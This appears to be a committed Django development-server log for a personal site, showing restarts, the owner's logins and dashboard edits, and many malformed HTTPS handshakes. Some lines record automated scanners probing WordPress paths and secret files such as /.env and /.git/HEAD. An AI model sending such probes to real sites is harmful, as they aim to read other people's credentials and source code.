@@ -1,0 +1,624 @@
+[18/Apr/2024 17:28:13] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 17:28:15] "GET / HTTP/1.0" 200 1879
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 17:27:44
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 17:31:25] "GET / HTTP/1.0" 200 1879
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 17:31:19
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 17:31:50] "GET / HTTP/1.0" 200 1879
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 17:31:44
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 17:32:51
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 17:33:39] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 17:33:43] "GET /accounts/login/ HTTP/1.0" 200 2902
+[18/Apr/2024 17:33:47] "POST /accounts/login/ HTTP/1.0" 200 3070
+[18/Apr/2024 17:33:48] "GET /accounts/login/ HTTP/1.0" 200 2902
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 17:33:36
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 17:34:25] "GET /accounts/login/ HTTP/1.0" 200 2902
+[18/Apr/2024 17:34:31] "POST /accounts/login/ HTTP/1.0" 302 0
+[18/Apr/2024 17:34:31] "GET /dashboard/ HTTP/1.0" 200 3187
+[18/Apr/2024 17:34:50] "GET /dashboard/profile HTTP/1.0" 200 4032
+[18/Apr/2024 17:35:14] "POST /dashboard/profile HTTP/1.0" 302 0
+[18/Apr/2024 17:35:15] "GET /dashboard/profile HTTP/1.0" 200 4075
+[18/Apr/2024 17:35:16] "POST /dashboard/profile HTTP/1.0" 302 0
+[18/Apr/2024 17:35:16] "GET /dashboard/profile HTTP/1.0" 200 4075
+[18/Apr/2024 17:35:20] "GET /dashboard/ HTTP/1.0" 200 3187
+[18/Apr/2024 17:35:22] "GET /u/fmartns/ HTTP/1.0" 200 5844
+[18/Apr/2024 17:35:29] "GET /u/fmartns/ HTTP/1.0" 200 5844
+[18/Apr/2024 17:42:24] "HEAD / HTTP/1.0" 200 0
+[18/Apr/2024 17:42:24] "GET / HTTP/1.0" 200 1876
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 17:34:23
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 17:45:59] "HEAD / HTTP/1.0" 200 0
+[18/Apr/2024 17:45:59] "GET / HTTP/1.0" 200 1876
+[18/Apr/2024 17:46:14] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 17:46:32] "GET /accounts/login/ HTTP/1.0" 200 2902
+[18/Apr/2024 17:46:41] "POST /accounts/login/ HTTP/1.0" 302 0
+[18/Apr/2024 17:46:41] "GET /dashboard/ HTTP/1.0" 200 3187
+[18/Apr/2024 17:46:45] "GET /dashboard/administration/ HTTP/1.0" 200 3073
+[18/Apr/2024 17:46:46] "GET /dashboard/administration/links/ HTTP/1.0" 200 3231
+[18/Apr/2024 17:46:50] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:47:10] "POST /dashboard/administration/links/add/ HTTP/1.0" 302 0
+[18/Apr/2024 17:47:11] "GET /dashboard/administration/links/ HTTP/1.0" 200 3759
+[18/Apr/2024 17:47:20] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:47:34] "POST /dashboard/administration/links/add/ HTTP/1.0" 302 0
+[18/Apr/2024 17:47:34] "GET /dashboard/administration/links/ HTTP/1.0" 200 4284
+[18/Apr/2024 17:47:36] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:47:51] "POST /dashboard/administration/links/add/ HTTP/1.0" 302 0
+[18/Apr/2024 17:47:51] "GET /dashboard/administration/links/ HTTP/1.0" 200 4798
+[18/Apr/2024 17:47:54] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:48:11] "POST /dashboard/administration/links/add/ HTTP/1.0" 302 0
+[18/Apr/2024 17:48:11] "GET /dashboard/administration/links/ HTTP/1.0" 200 5322
+[18/Apr/2024 17:48:13] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:48:27] "POST /dashboard/administration/links/add/ HTTP/1.0" 302 0
+[18/Apr/2024 17:48:27] "GET /dashboard/administration/links/ HTTP/1.0" 200 5845
+[18/Apr/2024 17:48:29] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:48:43] "POST /dashboard/administration/links/add/ HTTP/1.0" 302 0
+[18/Apr/2024 17:48:43] "GET /dashboard/administration/links/ HTTP/1.0" 200 6365
+[18/Apr/2024 17:48:44] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:49:10] "POST /dashboard/administration/links/add/ HTTP/1.0" 302 0
+[18/Apr/2024 17:49:10] "GET /dashboard/administration/links/ HTTP/1.0" 200 6889
+[18/Apr/2024 17:49:15] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:49:32] "POST /dashboard/administration/links/add/ HTTP/1.0" 302 0
+[18/Apr/2024 17:49:32] "GET /dashboard/administration/links/ HTTP/1.0" 200 7407
+[18/Apr/2024 17:49:36] "GET /dashboard/administration/links/add/ HTTP/1.0" 200 3732
+[18/Apr/2024 17:50:00] "GET /dashboard/administration/ HTTP/1.0" 200 3073
+[18/Apr/2024 17:50:01] "GET /dashboard/links/ HTTP/1.0" 200 3801
+[18/Apr/2024 17:50:05] "POST /dashboard/links/ HTTP/1.0" 302 0
+[18/Apr/2024 17:50:05] "GET /dashboard/links/ HTTP/1.0" 200 4355
+[18/Apr/2024 17:50:10] "POST /dashboard/links/ HTTP/1.0" 302 0
+[18/Apr/2024 17:50:10] "GET /dashboard/links/ HTTP/1.0" 200 4894
+[18/Apr/2024 17:50:14] "POST /dashboard/links/ HTTP/1.0" 302 0
+[18/Apr/2024 17:50:14] "GET /dashboard/links/ HTTP/1.0" 200 5445
+[18/Apr/2024 17:50:20] "POST /dashboard/links/ HTTP/1.0" 302 0
+[18/Apr/2024 17:50:20] "GET /dashboard/links/ HTTP/1.0" 200 5994
+[18/Apr/2024 17:50:30] "POST /dashboard/links/ HTTP/1.0" 302 0
+[18/Apr/2024 17:50:30] "GET /dashboard/links/ HTTP/1.0" 200 6542
+[18/Apr/2024 17:50:32] "GET /dashboard/ HTTP/1.0" 200 3187
+[18/Apr/2024 17:50:33] "GET /u/fmartns/ HTTP/1.0" 200 6522
+[18/Apr/2024 18:39:01] "GET / HTTP/1.1" 200 1876
+[18/Apr/2024 18:47:27] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 18:47:41] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 18:47:42] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 18:47:44] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 18:56:48] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 18:56:55] "GET /terms/ HTTP/1.0" 200 2525
+[18/Apr/2024 18:56:59] "GET /contact/ HTTP/1.0" 200 2561
+[18/Apr/2024 18:57:08] "POST /contact/ HTTP/1.0" 500 145
+[18/Apr/2024 18:57:13] "GET /contact/ HTTP/1.0" 200 2561
+[18/Apr/2024 18:57:18] "GET /fsdkf HTTP/1.0" 404 1846
+[18/Apr/2024 18:57:55] "GET /u/ HTTP/1.0" 404 1846
+[18/Apr/2024 18:58:02] "GET /u/fuck HTTP/1.0" 301 0
+[18/Apr/2024 18:58:02] "GET /u/fuck/ HTTP/1.0" 404 1846
+[18/Apr/2024 18:59:48] code 400, message Bad request version (']\x06\x8d\x84')
+[18/Apr/2024 18:59:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 18:59:48] code 400, message Bad request version ('\x00\x02\x01\x00\x00')
+[18/Apr/2024 18:59:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 18:59:48] code 400, message Bad request version ('¾àääHJÊWRÄïõ\x9d\x99^7¹;)®¼®Æ\x93\x00')
+[18/Apr/2024 18:59:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 18:59:48] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 18:59:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 18:59:48] code 400, message Bad request version ('\x03\x86Ýû&f\x8eØ\x93¸¿%Ó+\x9c')
+[18/Apr/2024 18:59:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 18:59:48] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02N\x01\x00\x02J\x03\x03\x7fÆ]^\x1a\xadm{[Ëå91×\x86EFäßÉ\x19Ê')
+[18/Apr/2024 18:59:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:11:40] "GET / HTTP/1.0" 200 1876
+[18/Apr/2024 19:14:53] "GET / HTTP/1.0" 200 1876
+[18/Apr/2024 19:16:38] "GET / HTTP/1.0" 200 1879
+[18/Apr/2024 19:16:50] code 400, message Bad request version ('jj\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01á')
+[18/Apr/2024 19:16:50] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:16:50] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 19:16:50] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:16:50] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 19:16:50] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:16:50] code 400, message Bad request version ('ªª\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01Ázz\x00\x00\x003\x00+\x00)')
+[18/Apr/2024 19:16:50] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:21:57] code 400, message Bad request version ('\x00\x02\x01\x00\x00#\x00\x00\x00')
+[18/Apr/2024 19:21:57] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:21:57] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02.\x01\x00\x02*\x03\x03Dù¤\x17¨ÍlÑÞÜn÷\x13\x9a2\x02ÄÌåx&u½%\x10ô§×õÜJ\x8c')
+[18/Apr/2024 19:21:57] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:21:58] code 400, message Bad request syntax ('\x16\x03\x01\x02N\x01\x00\x02J\x03\x03\x90P\x16\x9bëO')
+[18/Apr/2024 19:21:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:21:58] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 19:21:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:22:01] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:22:03] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:22:04] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:22:06] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:23:41] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:23:46] "GET / HTTP/1.0" 400 143
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 17:45:50
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 19:25:34] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:25:34] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:25:34] "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:34] "GET /xmlrpc.php?rsd HTTP/1.0" 400 143
+[18/Apr/2024 19:25:34] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:25:34] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:35] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:36] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:36] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:36] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:25:36] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 400 143
+[18/Apr/2024 19:26:03] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:28:50] "GET /.git/HEAD HTTP/1.0" 400 143
+[18/Apr/2024 19:29:14] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:29:19] code 400, message Bad request version ('V«')
+[18/Apr/2024 19:29:19] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:29:19] code 400, message Bad request version ('\x9a\x9a\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01Á')
+[18/Apr/2024 19:29:19] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:29:20] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 19:29:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:29:20] code 400, message Bad request version ('õ\x92\x11»')
+[18/Apr/2024 19:29:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:29:58] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 19:30:02] code 400, message Bad request version ('fmartns.dev\x00#\x00\x00\x00+\x00\x07\x06')
+[18/Apr/2024 19:30:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:30:02] code 400, message Bad request version ('+zs\x00\x12\x00\x00\x00\x1b\x00\x03\x02\x00\x02\x00')
+[18/Apr/2024 19:30:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:30:02] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 19:30:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:30:02] code 400, message Bad request version ('fmartns.dev\x003\x00+\x00)')
+[18/Apr/2024 19:30:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 19:32:48] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 20:05:10] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 20:06:34] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 20:22:27] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 20:26:40] code 400, message Bad request syntax ('\x16\x03\x01\x02N\x01\x00\x02J\x03\x03cz¥<\x89¡½j*ßX\x84*')
+[18/Apr/2024 20:26:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:26:40] code 400, message Bad request version ('ÕmS\x9eñ\x9bx"¤ñì+0\\\x0f{ÄÆ\x96uXØ?ÓsÈ4]ÛÉ;\x19\x00\x90\x94')
+[18/Apr/2024 20:26:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:26:40] code 400, message Bad request version ('àÚ/ù´\x87{°[¥Mßü©ë5;"Úx^\x88\x10Ìu')
+[18/Apr/2024 20:26:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:26:40] code 400, message Bad request version ("ª\x92\xad\x14vò\x02I\x91\x83³\x8dø¬V;ò®à'")
+[18/Apr/2024 20:26:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:29:32] code 400, message Bad request version ('\x025&Æ\x03#\x05¦£´fý\x0eÐ\x1b\x19g')
+[18/Apr/2024 20:29:32] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:29:32] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02N\x01\x00\x02J\x03\x03\x7fCìÆwbÔÍUlä!»NÎþ\x81´Yb\x99Y;Qås=%ëUý\x9e')
+[18/Apr/2024 20:29:32] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:29:33] code 400, message Bad request version ('|}½7øH¾å¬`\x12\x82yº®ýY\x8e\x87\x81Z\x03\x00')
+[18/Apr/2024 20:29:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:29:33] code 400, message Bad request version ('\x92HTP\x04À\x94')
+[18/Apr/2024 20:29:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:29:33] code 400, message Bad request version ('ºº\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01\x93')
+[18/Apr/2024 20:29:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:29:33] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02N\x01\x00\x02J\x03\x03Æ\x9eïÄ8lÑ÷Ë\x9amÑîf\x95×\x93¥\x1b\x1aGÐ8T\x08ùMÐùÊ:Q')
+[18/Apr/2024 20:29:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 20:30:03] "GET / HTTP/1.0" 400 143
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 19:24:19
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 20:48:30] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 20:55:03] "GET /.env HTTP/1.0" 400 143
+[18/Apr/2024 20:55:04] "POST / HTTP/1.0" 400 143
+[18/Apr/2024 21:35:06] "HEAD / HTTP/1.0" 400 0
+[18/Apr/2024 21:38:57] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 21:40:04] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 21:45:42] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 21:45:47] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:45:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:45:47] code 400, message Bad request version ('\x91¹/®¥´ÙØ?')
+[18/Apr/2024 21:45:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:45:48] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:45:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:45:48] code 400, message Bad request version ('Ühö^2F²\x7fÏü´+y\x880eSW\x7f·ìÿ&\x9f«x\x8fêÓ\x9ei¨×QVÎ(ÌÐAøîR¯{íßWNÖ\x00')
+[18/Apr/2024 21:45:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:45:59] code 400, message Bad request version ('^$³8')
+[18/Apr/2024 21:45:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:45:59] code 400, message Bad request version ('\x9a\x9a\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01á')
+[18/Apr/2024 21:45:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:45:59] "GET /robots.txt HTTP/1.0" 400 143
+[18/Apr/2024 21:45:59] code 400, message Bad request version ('\x7f\x07WÎ#Î')
+[18/Apr/2024 21:45:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:45:59] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x9f\x00Ç]\x9b\x86w¯k')
+[18/Apr/2024 21:45:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:46:17] code 400, message Bad request version ('ø¿êIÚ')
+[18/Apr/2024 21:46:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:46:17] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:46:17] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:46:18] code 400, message Bad request version ('¿S')
+[18/Apr/2024 21:46:18] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:46:18] code 400, message Bad request version ('êê\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01\x93')
+[18/Apr/2024 21:46:18] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:46:25] "GET / HTTP/1.0" 400 143
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 20:34:15
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 18, 2024 - 21:47:30
+Django version 4.2.11, using settings 'fmartns.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[18/Apr/2024 21:48:35] code 400, message Bad request version ('³\x7fb\x00\x05\x00\x05\x01\x00\x00\x00\x00\x00')
+[18/Apr/2024 21:48:35] code 400, message Bad request version ('W')
+[18/Apr/2024 21:48:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:35] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:48:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:35] code 400, message Bad request version ('fmartns.dev\x00\x17\x00\x00\x00-\x00\x02\x01\x01\x00\x12\x00\x00\x00')
+[18/Apr/2024 21:48:35] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:36] code 400, message Bad request version ('fmartns.dev\x00')
+[18/Apr/2024 21:48:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:36] code 400, message Bad request syntax ('\x16\x03\x01\x02.\x01\x00\x02*\x03\x03÷³Öx¯')
+[18/Apr/2024 21:48:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:37] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:48:37] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:37] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:48:37] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:38] code 400, message Bad request version ('fmartns.dev\x00')
+[18/Apr/2024 21:48:38] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:38] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03F½I÷×'øg`æ@")
+[18/Apr/2024 21:48:38] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:39] code 400, message Bad request version ('ªª\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01\x93')
+[18/Apr/2024 21:48:39] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:39] code 400, message Bad request version ('\x02h2\x08http/1.1Di\x00\x05\x00\x03\x02h2\x00-\x00\x02\x01\x01\x00')
+[18/Apr/2024 21:48:39] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:40] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:48:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:40] code 400, message Bad request version ('::\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01Ájj\x00\x00\x00\x17\x00\x00\x00+\x00\x07\x06JJ\x03\x04\x03\x03\x00')
+[18/Apr/2024 21:48:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:40] code 400, message Bad request version ('Ü\x06ÃüË\x92Ï¨')
+[18/Apr/2024 21:48:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:48:40] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:48:40] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:50:55] code 400, message Bad request version ('fmartns.dev\x00-\x00\x02\x01\x01\x00')
+[18/Apr/2024 21:50:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:50:55] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:50:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:50:55] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:50:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:50:55] code 400, message Bad request version ('¾+\x82NÛä%*3õsÊàë&OÃ#\x00')
+[18/Apr/2024 21:50:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:50:57] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 21:50:58] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 21:51:01] code 400, message Bad request version ('ÀO\x88³ê-:D\x05ç#D\x95')
+[18/Apr/2024 21:51:01] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:51:02] code 400, message Bad request version ('zz\x13\x01\x13\x02\x13\x03À+À/À,À0Ì©Ì¨À\x13À\x14\x00\x9c\x00\x9d\x00/\x005\x01\x00\x01Á')
+[18/Apr/2024 21:51:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:51:02] code 400, message Bad request syntax ('\x16\x03\x01\x02.\x01\x00\x02*\x03\x03&')
+[18/Apr/2024 21:51:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:51:02] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:51:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:51:02] code 400, message Bad request syntax ('\x16\x03\x01\x02\x0e\x01\x00\x02')
+[18/Apr/2024 21:51:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:51:02] code 400, message Bad request syntax ('\x16\x03\x01\x02.\x01\x00\x02*\x03\x03rË·Da`-\x06üââ½Äi\x19U·\x06N')
+[18/Apr/2024 21:51:02] You're accessing the development server over HTTPS, but it only supports HTTP.
+[18/Apr/2024 21:52:43] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 21:54:13] "GET / HTTP/1.0" 400 143
+[18/Apr/2024 21:54:17] "GET / HTTP/1.1" 301 0
+[18/Apr/2024 21:54:17] code 400, message Bad request version ('\x00\x12\x00\x10\x04\x03\x08\x04\x04\x01\x05\x03\x08\x05\x05\x01\x08\x06\x06\x01\x00#\x00\x00\x00')
+[18/Apr/2024 21:54:17] You're accessing the development server over HTTPS, but it only supports HTTP.
